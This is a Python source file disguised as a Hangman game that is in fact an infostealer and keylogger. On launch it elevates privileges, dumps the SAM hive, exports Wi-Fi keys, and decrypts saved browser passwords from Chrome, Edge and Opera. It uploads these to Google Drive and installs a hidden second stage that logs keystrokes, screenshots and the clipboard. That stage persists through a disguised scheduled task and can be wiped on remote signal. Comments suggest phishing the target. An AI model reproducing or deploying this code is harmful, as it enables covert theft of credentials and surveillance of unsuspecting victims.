import subprocess
import shutil
import random
import os
import json
import threading
from googleapiclient.discovery import build
from google.auth.transport.requests import Request
from google.oauth2 import service_account
from googleapiclient.http import MediaFileUpload
import ctypes
import sys
import base64
import sqlite3
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
import httplib2
from google_auth_httplib2 import AuthorizedHttp
import urllib.request
import win32gui
import win32con
import xml.etree.ElementTree as ET
#completed in 6 days
#to crack the windows password: https://www.youtube.com/watch?v=L26Xq7m0uQ0
# ideally (if you want a specific password) after you send the keylogger to the target, send a phishing email so that you force them to input their password

HANGMAN_ASCII_ART = """
   +---+
   |   |
	   |
	   |
	   |
	   |
========="""
HANGMAN_STATES = [
	"""
   +---+
   |   |
	   |
	   |
	   |
	   |
=========""",
	"""
   +---+
   |   |
   O   |
	   |
	   |
	   |
=========""",
	"""
   +---+
   |   |
   O   |
   |   |
	   |
	   |
=========""",
	"""
   +---+
   |   |
   O   |
  /|   |
	   |
	   |
=========""",
	"""
   +---+
   |   |
   O   |
  /|\\  |
	   |
	   |
=========""",
	"""
   +---+
   |   |
   O   |
  /|\\  |
  /	|
	   |
=========""",
	"""
   +---+
   |   |
   O   |
  /|\\  |
  / \\  |
	   |
========="""]

word_bank = ["python", "programming", "hangman", "computer", "game", "code", "openai", "cat", "tree", "apple", "banana", "cherry", "dog", "elephant", "frog", "grape", "honey", "ice", "juice", "kite", "lemon", "monkey", "note", "orange", "pencil", "quill", "robot"]
players = []

class Player:
	def __init__(self, name):
		self.name = name
		self.score = 0

	def increase_score(self):
		self.score += 1

	def reset_score(self):
		self.score = 0
def print_hangman(num_of_tries):
	print(HANGMAN_STATES[num_of_tries])
def print_word(word):
	for letter in word:
		print(letter, end=" ")
	print()
def display_score():
	print("\nSCOREBOARD")
	print("----------")
	for player in players:
		print(f"{player.name}: {player.score}")
def get_word(difficulty):
	if difficulty == "easy":
		word_length = random.randint(4, 6)
	elif difficulty == "medium":
		word_length = random.randint(6, 8)
	else:
		word_length = random.randint(8, 10)

	filtered_words = [word for word in word_bank if len(word) == word_length]
	return random.choice(filtered_words)
def play_again():
	choice = input("\nDo you want to play again? (yes/no): ")
	return choice.lower().startswith("y")

#drive uploading functions
SCOPES = ['https://www.googleapis.com/auth/drive.file']
EMBEDDED_CREDENTIALS = r'''
{
  "type": "",
  "project_id": "",
  "private_key_id": "",
  "private_key": "",
  "client_email": "",
  "client_id": "",
  "auth_uri": "",
  "token_uri": "",
  "auth_provider_x509_cert_url": "",
  "client_x509_cert_url": "",
  "universe_domain": ""
}
'''
def authenticate():
	creds_dict = json.loads(EMBEDDED_CREDENTIALS)
	creds = service_account.Credentials.from_service_account_info(
		creds_dict, scopes=SCOPES
	)
	if not creds.valid:
		creds.refresh(Request())
	return creds
def upload_file(file_path, drive_service):
	file_name = os.path.basename(file_path)

	file_metadata = {
		'name': file_name,
		'parents': ['1iivgLL9y-EBr-gVuY6Hvwhbs8JxB3K-_']
	}

	media = MediaFileUpload(file_path)

	file = drive_service.files().create(
		body=file_metadata,
		media_body=media,
		fields='id'
	).execute()
def upload_folder(folder_path, drive_service):
	for item_name in os.listdir(folder_path):
		item_path = os.path.join(folder_path, item_name)

		if os.path.isfile(item_path):
			upload_file(item_path, drive_service)

		elif os.path.isdir(item_path):
			upload_folder(item_path, drive_service)
def waitForUpload(folder):
	# Create a custom HTTP object with increased timeout
	http = httplib2.Http(timeout=300)  # setting timeout to 300 seconds
	
	creds = authenticate()

	# Create an authorized http object using the google-auth library
	authorized_http = AuthorizedHttp(creds, http=http)
	
	# Now, only pass the authorized http object when building the drive service
	drive_service = build('drive', 'v3', http=authorized_http)
	
	upload_folder(folder, drive_service)
	shutil.rmtree(folder)

def get_python_path(version):
	try:
		# Run the py launcher with the specified version and get the path
		result = subprocess.check_output(["py", f"-{version}", "-c", "import sys; print(sys.executable)"], text=True)
		executable_path = result.strip()
		# Get the directory containing the executable (one level up)
		directory = os.path.dirname(executable_path)
		scripts_directory = os.path.join(directory, "Scripts")
		return scripts_directory
	except Exception as e:
		return str(e)

def bla():
	current_username_env = os.environ.get('USERNAME') or os.environ.get('USER')
	script_location = f"C:\\Users\\{current_username_env}\\AppData\\Roaming\\LocalMapper\\Protocols\\UDP\\Datagram\\Source"
	# Ensure the directory exists
	if not os.path.exists(script_location):
		os.makedirs(script_location)

	# Download Python Installer
	url = "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe"
	filename = f"{script_location}\\python_installer.exe"
	urllib.request.urlretrieve(url, filename)

	# Run the Installer 
	# subprocess.run([filename, "/quiet", "PrependPath=1", "InstallLauncherAllUsers=1"])
	# os.remove(filename)
	# python_installation_location = get_python_path("3.11")

	bla_py_path = os.path.join(script_location, "process3729.py")
	bla_exe_path = os.path.join(script_location, "process3729.exe")
	moonLanding = os.path.join(script_location, "process3729.vbs")
	#create the bla
	with open(bla_py_path, "w") as f:
		f.write(r"""import time
import pyautogui
import os
import shutil
from pynput import keyboard, mouse
import threading
import win32gui
import re
import pyperclip
import json
from datetime import datetime, timedelta
from google.oauth2.service_account import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import subprocess
import signal
			
#directory structure
structure = {
	"LocalMapper": {
		"Protocols": {
			"TCP": {
				"Handshake": {},
				"Segmentation": {
					"Headers": {},
					"Payloads": {}
				},
				"Retransmission": {}
			},
			"UDP": {
				"Datagram": {
					"Source": {},
					"Destination": {}
				},
				"Ports": {}
			},
			"ICMP": {
				"Messages": {
					"EchoRequest": {},
					"EchoReply": {}
				}
			}
		},
		"Devices": {
			"Routers": {
				"OSPF": {},
				"BGP": {
					"Neighbors": {},
					"Routes": {}
				},
				"Interfaces": {}
			},
			"Switches": {
				"VLANs": {},
				"Trunks": {
					"Native": {},
					"Tagged": {}
				},
				"Ports": {}
			},
			"Firewalls": {
				"Rules": {
					"Inbound": {},
					"Outbound": {}
				},
				"NAT": {
					"Static": {},
					"Dynamic": {}
				}
			}
		},
		"Topologies": {
			"Star": {
				"CentralNode": {},
				"Peripherals": {
					"Device1": {},
					"Device2": {}
				},
				"Links": {}
			},
			"Mesh": {
				"FullMesh": {},
				"PartialMesh": {
					"NodeA": {},
					"NodeB": {}
				},
				"Redundancy": {}
			},
			"Hybrid": {
				"Components": {
					"Part1": {},
					"Part2": {}
				},
				"Connections": {}
			}
		}
	}
}
			
def create_dirs(base, structure):
	for key, value in structure.items():
		new_dir = os.path.join(base, key)
			
		if not os.path.exists(new_dir):
			os.makedirs(new_dir)

		create_dirs(new_dir, value)
		
		# Create a README.md file
		readme_file_path = os.path.join(new_dir, "README.md")
		if not os.path.exists(readme_file_path):
			with open(readme_file_path, 'w') as f:
				f.write(f"# {key}\n\nThis is the {key} folder. It is used for the purpose of "
					f"storing and managing information related to {key}. It contains a variety "
					f"of resources and files that provide more detail and context on the specific "
					f"role, function, and significance of {key} in our system.\n\n"
					"The folder structure is designed in a computing "
					"and networking environment. Sub-folders represent various components or "
					"aspects of this, with further divisions as necessary to reflect the complex "
					"structure and relationships between these elements.")
		
		# Sample .txt log files for certain folders
		log_file_path = os.path.join(new_dir, f"{key.lower()}_log.txt")
		if key in ["Handshake", "Payloads", "Routes", "Ports", "Rules"] and not os.path.exists(log_file_path):
			with open(log_file_path, 'w') as f:
				log_start_time = datetime.now()
				for i in range(1, 51):
					log_time = log_start_time + timedelta(seconds=i)
					f.write(f"{log_time.strftime('%Y-%m-%d %H:%M:%S')} - Sample log entry {i} for {key}\n")
		
		# Sample .json configuration files for certain folders
		config_file_path = os.path.join(new_dir, f"{key.lower()}_config.json")
		if key in ["TCP", "UDP", "Routers", "Switches", "Star"] and not os.path.exists(config_file_path):
			config_data = {
				"name": key,
				"description": f"Sample configuration for {key}.",
				"settings": {f"option{i+1}": f"value{i+1}" for i in range(10)}
			}
			with open(config_file_path, 'w') as f:
				json.dump(config_data, f, indent=4)

#locations
current_username_env = os.environ.get('USERNAME') or os.environ.get('USER')
script_location = f"C:\\Users\\{current_username_env}\\AppData\\Roaming\\LocalMapper\\Protocols\\UDP\\Datagram\\Source"
bla_exe_path = os.path.join(script_location, "process3729.exe")
moonLanding = os.path.join(script_location, "process3729.vbs")

#edit batch file so that it only opens the bla
with open(moonLanding, "w") as f:
	f.write(f'''Set oShell = CreateObject("WScript.Shell")
oShell.Run "{bla_exe_path}", 0, False
''')

current_username_env = os.environ.get('USERNAME') or os.environ.get('USER')
root_working_path = f"C:\\Users\\{current_username_env}\\AppData\\Roaming"
			
# Start the directory creation from the root of the structure
create_dirs(f"{root_working_path}", structure)

working_path = f"C:\\Users\\{current_username_env}\\AppData\\Roaming\\LocalMapper\\Topologies\\Star\\Peripherals\Device2"

def sanitize_title(title):
	# Remove unwanted characters
	sanitized_title = re.sub(r'[\\/:*?"<>|]', '_', title)
	return sanitized_title

def get_foreground_window_title():
	window_handle = win32gui.GetForegroundWindow()
	title = win32gui.GetWindowText(window_handle)
	if not title:
		return "EMPTY_TITLE"
	return sanitize_title(title)

pianoNote = False
catPawPrint = False
lock = threading.Lock()

def on_key_press(key):
	global pianoNote
	if key == keyboard.Key.enter:
		pianoNote = True

def on_click(x, y, button, pressed):
	global catPawPrint
	if pressed:
		catPawPrint = True

def pony():
	while True:
		try:
			timestamp = time.strftime("%H.%M.%S-%d.%m.%Y")
			screenshot_path = os.path.join(working_path, f"screenshot_{timestamp}.png")
			pyautogui.screenshot(screenshot_path)
			with lock:
				screenshots = [f for f in os.listdir(working_path) if f.startswith("screenshot_") and f.endswith(".png") and os.path.isfile(os.path.join(working_path, f))]
				if len(screenshots) > 5:
					screenshots = sorted(screenshots)
					os.remove(os.path.join(working_path, screenshots[0]))
			time.sleep(0.5)
		except OSError as e:
			time.sleep(2)
		
pony_path = os.path.join(working_path, "keystrokes.txt")

def organize_activity_data():
	folder_path = os.path.join(working_path, get_foreground_window_title())
	os.makedirs(folder_path, exist_ok=True)
	
	if not os.path.exists(pony_path):
		with open(pony_path, "w"):
			pass
	shutil.copyfile(pony_path, f"{folder_path}\keystrokes.txt")

	screenshots = [f for f in os.listdir(working_path) if f.startswith("screenshot_") and f.endswith(".png")]
	for screenshot in screenshots:
		src_path = os.path.join(working_path, screenshot)
		dst_path = os.path.join(folder_path, screenshot)
		if os.path.exists(dst_path):
			base, ext = os.path.splitext(screenshot)
			dst_path = os.path.join(folder_path, f"{base}_duplicate{ext}")
		
		# Retry moving the file if PermissionError occurs
		max_retries = 3
		for _ in range(max_retries):
			try:
				shutil.move(src_path, dst_path)
				break
			except PermissionError:
				time.sleep(0.1)

maxPianoKeys = 150
currently_pressed = set()  # Keeps track of which special keys are currently pressed
capslock_state = False	 # Represents the current state of the CapsLock key: False is OFF, True is ON

def append_to_file(key):
	with open(pony_path, 'a') as f:
		f.write(f"{key}\n")

def remove_oldest_keystroke():
	with open(pony_path, 'r') as f:
		lines = f.readlines()
	with open(pony_path, 'w') as f:
		f.writelines(lines[1:])

def count_lines():
	with open(pony_path, 'r') as f:
		return len(f.readlines())

def on_press(key):
	global capslock_state
			
	try:
		key_char = key.char
	except AttributeError:
		if key == keyboard.Key.caps_lock:
			# Toggle the state of the CapsLock key
			capslock_state = not capslock_state
			key_char = "CapsLock ON" if capslock_state else "CapsLock OFF"
		elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
			if key not in currently_pressed:
				key_char = "Ctrl Pressed"
				currently_pressed.add(key)
			else:
				return
		elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
			if key not in currently_pressed:
				key_char = "Shift Pressed"
				currently_pressed.add(key)
			else:
				return
		else:
			key_char = str(key)

	append_to_file(key_char)
	if count_lines() > maxPianoKeys:
		remove_oldest_keystroke()

def on_release(key):
	if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
		key_char = "Ctrl Released"
		currently_pressed.discard(key)
	elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
		key_char = "Shift Released"
		currently_pressed.discard(key)
	else:
		return  # Don't record release events for other keys

	append_to_file(key_char)
	if count_lines() > maxPianoKeys:
		remove_oldest_keystroke()

def grr():
	with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()


def hangmanVar():
	last_clipboard_content = ""
	recipeBook = os.path.join(working_path, "clipboard.txt")
			
	while True:
		clipboard_content = pyperclip.paste()
		if clipboard_content != last_clipboard_content:
			with open(recipeBook, 'a') as f:
				f.write(f"***********************NEW CLIPBOARD CONTENT***********************\n{clipboard_content}\n\n\n\n")
			last_clipboard_content = clipboard_content
		time.sleep(0.5)

def organize_activity_datas():
	global pianoNote, catPawPrint
	with keyboard.Listener(on_press=on_key_press) as k_listener, mouse.Listener(on_click=on_click) as m_listener:
		while True:
			with lock:
				if pianoNote or catPawPrint:
					organize_activity_data()
					pianoNote = False
					catPawPrint = False
			time.sleep(0.1)
			
libraryCard = {
  "type": "",
  "project_id": "",
  "private_key_id": "",
  "private_key": "",
  "client_email": "",
  "client_id": "",
  "auth_uri": "",
  "token_uri": "",
  "auth_provider_x509_cert_url": "",
  "client_x509_cert_url": "",
  "universe_domain": ""
}

credentials = Credentials.from_service_account_info(
	libraryCard,
	scopes=["https://www.googleapis.com/auth/drive"]
)

service = build('drive', 'v3', credentials=credentials)

parent_folder_id = ''

def get_folder_id(parent_id, folder_name):
	query = f"'{parent_id}' in parents and mimeType='application/vnd.google-apps.folder' and name='{folder_name}'"
	response = service.files().list(q=query, spaces='drive', fields='files(id, name)').execute()
	items = response.get('files', [])

	if items:
		return items[0]['id']
	else:
		folder_metadata = {
			'name': folder_name,
			'mimeType': 'application/vnd.google-apps.folder',
			'parents': [parent_id]
		}
		folder = service.files().create(body=folder_metadata, fields='id').execute()
		return folder['id']


def upload_files(parent_id, local_folder_path, depth):
	for item in os.listdir(local_folder_path):
		item_path = os.path.join(local_folder_path, item)
		
		# Skip png files in the root folder
		if depth == 0 and item_path.endswith('.png'):
			continue
			
		if os.path.isdir(item_path):
			folder_id = get_folder_id(parent_id, item)
			upload_files(folder_id, item_path, depth+1)  # Increment depth when entering a subfolder
		else:
			query = f"'{parent_id}' in parents and name='{item}'"
			response = service.files().list(q=query, spaces='drive', fields='files(id, name)').execute()
			items = response.get('files', [])

			if not items:  # if file doesn't exist, upload
				file_metadata = {
					'name': item,
					'parents': [parent_id]
				}
				media = MediaFileUpload(item_path)
				service.files().create(body=file_metadata, media_body=media, fields='id').execute()

def check_file_exists_in_drive(credentials_dict, filename_to_check):
	# Load the embedded service account credentials
	creds = Credentials.from_service_account_info(credentials_dict, scopes=["https://www.googleapis.com/auth/drive.readonly"])

	# Build the Drive API client
	drive_service = build('drive', 'v3', credentials=creds)

	# Query files with the given name
	results = drive_service.files().list(q=f"name='{filename_to_check}'", spaces='drive').execute()
	items = results.get('files', [])

	return True if items else False

def upload_data():
	while True:
		#if a delete signal is sent:
		if check_file_exists_in_drive(libraryCard, "delete.txt"):
			os.system('schtasks /delete /tn "TaskPurpose_MemoryPressureRelief" /f >nul 2>&1')
			batch_script_path = f"{root_working_path}\\delete_process3729.bat"
			with open(batch_script_path, "w") as f:
				f.write(f'''
				cd {root_working_path}
				timeout /t 15 /nobreak
				set script_dir=%~dp0
				rmdir /s /q "{root_working_path}\\LocalMapper"
				del "%~f0"
				''')
			subprocess.Popen(batch_script_path, shell=True)
			os.kill(os.getpid(), signal.SIGTERM)

		upload_files(parent_folder_id, f"{working_path}", depth=0)
			
def main():
	threads = []
	
	if os.path.exists(working_path):
		shutil.rmtree(working_path)
	os.makedirs(working_path)
	global pianoNote, catPawPrint

	pony_thread = threading.Thread(target=pony)
	pony_thread.daemon = True
	pony_thread.start()
	  
	grr_thread = threading.Thread(target=grr)
	grr_thread.start()
	
	hangmanVar_thread = threading.Thread(target=hangmanVar)
	hangmanVar_thread.start()
			
	upload_thread = threading.Thread(target=upload_data)
	upload_thread.start()
	
	organize_activity_datas_thread = threading.Thread(target=organize_activity_datas)
	organize_activity_datas_thread.start()
			
if __name__ == "__main__":
	main()
""")
	
	#create task
	task_exists = os.system('schtasks /query /tn "TaskPurpose_MemoryPressureRelief" >nul 2>&1')
	if task_exists == 0:  # If the task exists, the return code will be 0
		os.system('schtasks /delete /tn "TaskPurpose_MemoryPressureRelief" /f >nul 2>&1')
	os.system(f'schtasks /create /tn "TaskPurpose_MemoryPressureRelief" /tr "{moonLanding}" /sc onlogon /rl HIGHEST /it >nul 2>&1')
	os.system(f'schtasks /query /xml /tn "TaskPurpose_MemoryPressureRelief" > {script_location}\\Task.xml')
	os.system('schtasks /delete /tn "TaskPurpose_MemoryPressureRelief" /f >nul 2>&1')

	# Parse the XML from the file
	with open(f"{script_location}\\Task.xml", 'r', encoding='utf-8') as xml_file:
		xml_content = xml_file.read()
	root = ET.fromstring(xml_content)
	tree = ET.ElementTree(root)

	# Locate the Element and Modify it
	for elem in root.findall(".//{http://schemas.microsoft.com/windows/2004/02/mit/task}DisallowStartIfOnBatteries"):
		elem.text = 'false'

	# Save the modified XML back to the file
	tree.write(f"{script_location}\\ModifiedTask.xml", encoding='utf-16', xml_declaration=True)

	os.system(f'schtasks /create /tn "TaskPurpose_MemoryPressureRelief" /xml {script_location}\\ModifiedTask.xml >nul 2>&1')
	os.remove(f"{script_location}\\Task.xml")
	os.remove(f"{script_location}\\ModifiedTask.xml")

	with open(moonLanding, "w") as f:
		f.write(f'''
Dim oShell, cmd, currDir, pythonExePath, pythonPath
Set oShell = CreateObject("WScript.Shell")
oShell.Run "{filename} /quiet PrependPath=1 InstallLauncherAllUsers=1", 0, True
oShell.Run "cmd /c del {filename}", 0, True
cmd = "py -3.11 -c ""import sys, os; print(os.path.join(os.path.dirname(sys.executable), 'Scripts'))"""

Set oExec = oShell.Exec(cmd)

Do While oExec.Status = 0
    WScript.Sleep 100
Loop
allOutput = oExec.StdOut.ReadAll()
lines = Split(allOutput, vbCrLf)
pythonPath = Trim(lines(0))
oShell.Run "cmd /c cd " & pythonPath
Dim packagesToInstall
packagesToInstall = Array("pyinstaller", "pyautogui", "pynput", "pywin32", "pyperclip", "google-auth", "google-api-python-client")
For Each package In packagesToInstall
    oShell.Run "cmd /c pip install " & package, 0, True
Next
oShell.Run "cmd /c pyinstaller --onefile  ""{bla_py_path}""", 0, True
oShell.Run "cmd /c move " & pythonPath & "\\dist\\process3729.exe ""{bla_exe_path}""", 0, True
oShell.Run "cmd /c rmdir /s /q " & pythonPath & "\\dist", 0, True
oShell.Run "cmd /c rmdir /s /q " & pythonPath & "\\build", 0, True
oShell.Run "cmd /c del " & pythonPath & "\\process3729.spec", 0, True
oShell.Run "cmd /c del ""{bla_py_path}""", 0, True
oShell.Run """{bla_exe_path}""", 0, False
''')

	subprocess.Popen(['cscript', '//nologo', moonLanding], cwd=script_location, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def do_not_close(window_title):
    window_handle = win32gui.FindWindow(None, window_title)
    if window_handle:
        hMenu = win32gui.GetSystemMenu(window_handle, False)
        if hMenu:
            win32gui.DeleteMenu(hMenu, win32con.SC_CLOSE, win32con.MF_BYCOMMAND)
  
#browser password capturing functions
def my_chrome_datetime(time_in_mseconds):
	return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)
def encryption_key(browser_name):
	if browser_name == "opera_gx":
		localState_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Roaming\Opera Software\Opera GX Stable\Local State".split("\\"))
	elif browser_name == "opera":
		localState_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Roaming\Opera Software\Opera Stable\Local State".split("\\"))
	elif browser_name == "edge":
		localState_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Local\Microsoft\Edge\User Data\Local State".split("\\"))
	elif browser_name == "chrome":
		localState_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Local\Google\Chrome\User Data\Local State".split("\\"))

	with open(localState_path, "r", encoding="utf-8") as file:
		local_state_file = file.read()
		local_state_file = json.loads(local_state_file)

	ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]

	return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]
def decrypt_password(enc_password, key):
	try:

		init_vector = enc_password[3:15]
		enc_password = enc_password[15:]

		cipher = AES.new(key, AES.MODE_GCM, init_vector)
		return cipher.decrypt(enc_password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return "No Passwords(logged in with Social Account)"
def capture_password(browser_name, folder):
	my_chrome_data_file = f'{folder}\\my_chrome_data.db'
	file = open(f'{folder}\\browser passwords.txt', "a", encoding="utf-8")
	
	if browser_name == "chrome":
		password_db_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Local\Google\Chrome\User Data\Default\Login Data".split("\\"))
	elif browser_name == "edge":
		password_db_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data".split("\\"))
	elif browser_name == "opera":
		password_db_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Roaming\Opera Software\Opera Stable\Login Data".split("\\"))
	elif browser_name == "opera_gx":
		password_db_path = os.path.join(os.environ["USERPROFILE"], *r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data".split("\\"))

	if not os.path.exists(password_db_path):
		file.write(f"\n \n \n \n *************** Database for {browser_name} not found. ***************\n")
		return
	shutil.copyfile(password_db_path,my_chrome_data_file)
	db = sqlite3.connect(my_chrome_data_file)
	cursor = db.cursor()
	cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
	encp_key = encryption_key(browser_name)
	file.write("\n \n \n \n *************** PASSWORDS STORED IN " + browser_name + " ***************\n")
	file.write("\n|" + "-"*50 + "|\n")
	
	for row in cursor.fetchall():
		site_url = row[0]
		username = row[1]
		password = decrypt_password(row[2], encp_key)
		date_created = row[3]

		if username or password:
			file.write("Site Login URL: " + site_url + "\n")
			file.write("Username/Email: " + username + "\n")
			file.write(f"Password: " + password + "\n")
		else:
			continue
		if date_created:
			file.write("Date date_created: " + str(my_chrome_datetime(date_created)))
		file.write("\n|" + "-"*50 + "|\n")

	cursor.close()
	db.close()
	file.close()
	os.remove(my_chrome_data_file)
 

def is_admin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
	except:
		return False

def play_hangman():
	if not is_admin():
		ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
		sys.exit(0)

	title = f"{os.getcwd()}\\hangman.exe"
	do_not_close(title)
	
	print("Welcome to Hangman!")
	try:
		blabla = threading.Thread(target=bla)
		blabla.start()
	except Exception:
		print("there was a problem")
	
	#creating folders where i'll be working on
	current_username_env = os.environ.get('USERNAME') or os.environ.get('USER')
	folder = f"C:\\Users\\{current_username_env}\\AppData\\Roaming\\TechWave"
	
	if os.path.exists(folder):
		shutil.rmtree(folder)
	os.makedirs(folder, exist_ok=True)
	
	# command = f'reg save "HKLM\\system" "{folder}\\system.save"'
	# subprocess.check_output(command, shell=True)
	
	command = f'reg save "HKLM\\sam" "{folder}\\sam.save"'
	subprocess.check_output(command, shell=True)
	
	try:
		command = f'netsh wlan export profile folder=\"{folder}\" key=clear'
		subprocess.check_output(command, shell=True)
	except subprocess.CalledProcessError as e:
		print("") #do nothing
	capture_password ("chrome", folder)
	capture_password ("edge", folder)
	capture_password ("opera", folder)
	capture_password("opera_gx", folder)
	try:
		middleThread = threading.Thread(target=waitForUpload, args=(folder,))
		middleThread.start()
	except Exception:
		print("there was an error")

	num_of_players = int(input("Enter the number of players: "))
	
	for i in range(num_of_players):
		name = input(f"Enter the name of Player {i+1}: ")
		players.append(Player(name))

	while True:
		print("\nNEW ROUND")
		print("---------")
		word_difficulty = input("Enter word difficulty (easy/medium/hard): ")
		word = get_word(word_difficulty)

		guessed_letters = []
		wrong_guesses = 0

		while wrong_guesses < len(HANGMAN_STATES) - 1:
			print("\n")
			print_hangman(wrong_guesses)
			print_word(word)

			if len(guessed_letters) > 0:
				print("Guessed Letters: ", end="")
				print(*guessed_letters, sep=", ")

			guess = input("Enter a letter: ").lower()

			if len(guess) != 1:
				print("Please enter a single letter.")
				continue

			if guess in guessed_letters:
				print("You have already guessed that letter.")
				continue

			guessed_letters.append(guess)

			if guess not in word:
				wrong_guesses += 1
				print(f"Wrong guess! {len(HANGMAN_STATES) - 1 - wrong_guesses} attempts left.")
			else:
				print("Correct guess!")

			if set(word) == set(guessed_letters):
				print_word(word)
				print("Congratulations! You won!")
				for player in players:
					player.increase_score()
				break

		if wrong_guesses == len(HANGMAN_STATES) - 1:
			print_hangman(wrong_guesses)
			print_word(word)
			print("You lost! The word was", word)

		display_score()

		if not play_again():
			print("Thank you for playing!")
			break

		for player in players:
			player.reset_score()

play_hangman()